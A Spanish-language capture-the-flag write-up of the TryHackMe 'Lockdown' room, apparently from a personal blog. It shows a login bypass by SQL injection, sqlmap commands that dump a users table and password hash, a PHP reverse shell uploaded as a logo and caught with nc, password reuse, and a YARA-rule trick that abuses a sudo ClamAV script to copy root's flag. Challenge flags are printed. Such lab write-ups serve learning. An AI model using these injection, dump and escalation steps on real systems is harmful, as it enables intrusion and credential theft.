---
tags:
title: Lockdown - Easy (THM)
permalink: /Lockdown-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
zs1n@ptw ~> nmapf 10.65.130.235
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-16 19:43 -0400
Initiating Ping Scan at 19:43
Scanning 10.65.130.235 [4 ports]
Completed Ping Scan at 19:43, 0.29s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:43
Completed Parallel DNS resolution of 1 host. at 19:43, 0.50s elapsed
Initiating SYN Stealth Scan at 19:43
Scanning 10.65.130.235 [65535 ports]
Discovered open port 22/tcp on 10.65.130.235
Discovered open port 80/tcp on 10.65.130.235
Completed SYN Stealth Scan at 19:44, 14.33s elapsed (65535 total ports)
Nmap scan report for 10.65.130.235
Host is up, received echo-reply ttl 62 (0.28s latency).
Scanned at 2026-03-16 19:43:54 EDT for 15s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.26 seconds
           Raw packets sent: 131081 (5.768MB) | Rcvd: 11 (468B)
-e [*] IP: 10.65.130.235
[*] Puertos abiertos: 22,80
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,80 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-16 19:44 -0400
Nmap scan report for 10.65.130.235
Host is up (0.38s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e4:8f:dd:66:a2:4e:5e:15:3b:17:c2:6b:03:b8:48:a6 (RSA)
|   256 05:67:69:b5:4c:d1:67:71:a3:7c:b7:98:b8:28:c7:ee (ECDSA)
|_  256 06:8c:a9:93:ba:ef:18:2e:38:29:11:0e:9d:6a:71:87 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Coronavirus Contact Tracer
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.75 seconds
```

## Website

La pagina principal, muestra un campo en el que tengo que colocar algún código para acceder al panel.

![image-center](/assets/images/Pasted image 20260316204553.png)
### SQL Injection

Usando un simple payload para pasar la validación como `'or 1=1-- -`, veo que en la respuesta aparece un mensaje de `success`.

![image-center](/assets/images/Pasted image 20260316204836.png)
### Admin panel and SQL injection

Use el mismo payload para poder acceder al panel de administración del usuario `admin`. En el pie de la pagina y ya en el propio titulo de la misma habla de `CTS-QR`, por lo que buscando por CVE's relacionados a este sistema encontré el [siguiente enlace](https://github.com/yihaofuweng/cve/issues/59).

El mismo demuestra que el parámetro `page=state` es vulnerable una `inyeccion SQL`, como demuestro a continuación.

![image-center](/assets/images/Pasted image 20260316210512.png)

Se puede ver que si envió la petición en la respuesta veo un `1`.

![image-center](/assets/images/Pasted image 20260316210526.png)

Pero si coloco una simple comilla `'`, veo como el código rompe, mostrándome así la `query` que se realiza por detrás.

![image-center](/assets/images/Pasted image 20260316210549.png)
## Shell as www-data
### sqlmap

Use `sqlmap` para que me automatice todo el proceso de enumeración de la base de datos, viendo así la base de datos `cts_db`.

```bash
zs1n@ptw ~> sqlmap -r req.txt --batch --dbs
..snip..

[20:05:53] [INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' injectable
[20:05:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:05:53] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:06:00] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[20:06:07] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[20:06:14] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[20:06:20] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[20:06:26] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[20:06:37] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[20:06:43] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[20:06:50] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[20:07:01] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[20:07:08] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[20:07:19] [INFO] checking if the injection point on POST parameter 'id' is a false positive
POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 311 HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id=(SELECT (CASE WHEN (5191=5191) THEN 1 ELSE (SELECT 9876 UNION SELECT 1800) END))&code=06&name=Iloilo&description=Region 6

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
    Payload: id=1 OR SLEEP(5)&code=06&name=Iloilo&description=Region 6
---
[20:07:21] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[20:07:23] [INFO] fetching database names
[20:07:23] [INFO] fetching number of databases
[20:07:23] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[20:07:23] [INFO] retrieved: 3
[20:07:26] [INFO] retrieved: information_schema
[20:08:08] [INFO] retrieved: performance_schema
[20:09:04] [INFO] retrieved: cts_db
available databases [3]:
[*] cts_db
[*] information_schema
[*] performance_schema

[20:09:19] [INFO] fetched data logged to text files under '/home/zsln/.local/share/sqlmap/output/contacttracer.thm'

[*] ending @ 20:09:19 /2026-03-16/
```
### Tables

Enumere las tablas.

```bash
zs1n@ptw ~> sqlmap -r req.txt --batch -D cts_db --tables --threads 10

..snip..

Database: cts_db
[8 tables]
+---------------+
| barangay_list |
| city_list     |
| establishment |
| people        |
| state_list    |
| system_info   |
| tracks        |
| users         |
+---------------+

[20:11:19] [INFO] fetched data logged to text files under '/home/zsln/.local/share/sqlmap/output/contacttracer.thm'

[*] ending @ 20:11:19 /2026-03-16/
```
### Administrator password

Por lo que luego dumpee los datos de la tabla `users` viendo asi el hash del usuario administrator.

```bash
zs1n@ptw ~> sqlmap -r req.txt --batch -D cts_db -T users --dump --threads 10
..snip..
+----+----------------------------+----------+----------+----------+--------------+---------------------+------------+---------------------+
| id | avatar                     | lastname | password | username | firstname    | date_added          | last_login | date_updated        |
+----+----------------------------+----------+----------+----------+--------------+---------------------+------------+---------------------+
| 1  | uploads/1773705720_cmd.php | Admin    | `3eba6f73c19818c36ba8fea761a3ce6d`  | admin    | Adminstrator | 2021-01-20 14:02:37 | NULL       | 2026-03-17 00:02:23 |
+----+----------------------------+----------+----------+----------+--------------+---------------------+------------+----------------
..snip..
```

Por lo que fui a crackstation para romper el mismo.

![image-center](/assets/images/Pasted image 20260316214031.png)
### Shell

Como la password por ahora no me sirve de nada, y tenia la posibilidad de cambiar el logo de la pagina principal de `login.php` por lo que subí una reverse shell en `php` para luego subirla en forma de imagen

![image-center](/assets/images/Pasted image 20260317025945.png)

Me desloguee de la pagina y fui a:

```bash
http://contacttracer.thm/login.php
```

Viendo que desde mi listener `nc` recibí la shell como el usuario `www-data`.

```bash
zs1n@ptw ~> sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.210.140] from (UNKNOWN) [10.65.182.217] 36620
Linux ip-10-65-182-217 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 06:02:20 up 22 min,  0 users,  load average: 0.00, 0.01, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -qc bash
```
## Shell as cyrus
### Password reuse

Luego use la password del usuario administrator para el usuario `cyrus`.

```bash
www-data@ip-10-65-130-235:/tmp$ su cyrus
Password:
cyrus@ip-10-65-130-235:/tmp$ cd /home/cyrus/
cyrus@ip-10-65-130-235:~$ ls
quarantine  testvirus  user.txt
cyrus@ip-10-65-130-235:~$ cat user.txt
THM{w4c1F5AuUNhHCJRtiGtRqZyp0QJDIbWS}
```
## Shell as root

### Sudo privileges

Viendo los permisos a nivel de sudo, vi esto:

```bash
#!/bin/bash
read -p "Enter path: " TARGET
if [[ -e "$TARGET" && -r "$TARGET" ]]
  then
    /usr/bin/clamscan "$TARGET" --copy=/home/cyrus/quarantine
    /bin/chown -R cyrus:cyrus /home/cyrus/quarantine
  else
    echo "Invalid or inaccessible path."
fi
```

### Database file

Vi que el archivo de base de datos se guarda en `/var/lib/clamav`.

```bash
cyrus@ip-10-65-182-217:/opt/scan$ cat /etc/clamav/freshclam.conf
# Automatically created by the clamav-freshclam postinst
# Comments will get lost when you reconfigure the clamav-freshclam package

DatabaseOwner clamav
UpdateLogFile /var/log/clamav/freshclam.log
LogVerbose false
LogSyslog false
LogFacility LOG_LOCAL6
LogFileMaxSize 0
LogRotate true
LogTime true
Foreground false
Debug false
MaxAttempts 5
DatabaseDirectory /var/lib/clamav
DNSDatabaseInfo current.cvd.clamav.net
ConnectTimeout 30
ReceiveTimeout 30
TestDatabases yes
ScriptedUpdates yes
CompressLocalDatabase no
Bytecode true
NotifyClamd /etc/clamav/clamd.conf
# Check for new database 24 times a day
Checks 24
DatabaseMirror db.local.clamav.net
DatabaseMirror database.clamav.net
```

En el mismo se puede ver el archivo `main.hdb` en el cual se establece una propia regla para un virus.

```bash
cyrus@ip-10-65-182-217:/opt/scan$ cd /var/lib/clamav
cyrus@ip-10-65-182-217:/var/lib/clamav$ ls
bytecode.cvd  freshclam.dat  main.hdb     tmp.df89d90ac0
daily.cld     main.cvd       mirrors.dat
cyrus@ip-10-65-182-217:/var/lib/clamav$
cyrus@ip-10-65-182-217:/var/lib/clamav$ ls
bytecode.cvd  freshclam.dat  main.hdb     tmp.df89d90ac0
daily.cld     main.cvd       mirrors.dat
cyrus@ip-10-65-182-217:/var/lib/clamav$ cat main.hdb
69630e4574ec6798239b091cda43dca0:69:EICAR_MD5
```
### Malicious rule

Asi que cree la mia, haciendo que si las palabras `root` o `THM{` se encuentran en el archivo que coloco, el script se encarga de marcarlo como virus y lo manda a mi carpeta `/quarantine`.

```bash
cyrus@ip-10-65-182-217:/var/lib/clamav$ cat rules.yar
rule PWNED
{
  strings:
    $a = "root"
    $b = "THM"

  condition:
    $b or $a
}
```
### Flag

Asi que ejecute el mismo colocando el nombre del archivo.

```bash
cyrus@ip-10-65-182-217:~$ sudo /opt/scan/scan.sh
Enter path: /root/root.txt
LibClamAV Warning: **************************************************
LibClamAV Warning: ***  The virus database is older than 7 days!  ***
LibClamAV Warning: ***   Please update it as soon as possible.    ***
LibClamAV Warning: **************************************************
/root/root.txt: YARA.PWNED.UNOFFICIAL FOUND
/root/root.txt: copied to '/home/cyrus/quarantine/root.txt'

----------- SCAN SUMMARY -----------
Known viruses: 2060012
Engine version: 0.103.12
Scanned directories: 0
Scanned files: 1
Infected files: 1
Data scanned: 0.00 MB
Data read: 0.00 MB (ratio 0.00:1)
Time: 11.503 sec (0 m 11 s)
Start Date: 2026:03:17 06:40:19
End Date:   2026:03:17 06:40:31
```

Viendo que en la ruta esta el archivo junto con su contenido.

```
cyrus@ip-10-65-182-217:~$ cat /home/cyrus/quarantine/root.txt
THM{IQ23Em4VGX91cvxsIzatpUvrW9GZZJxm}
```

`~Happy Hacking.`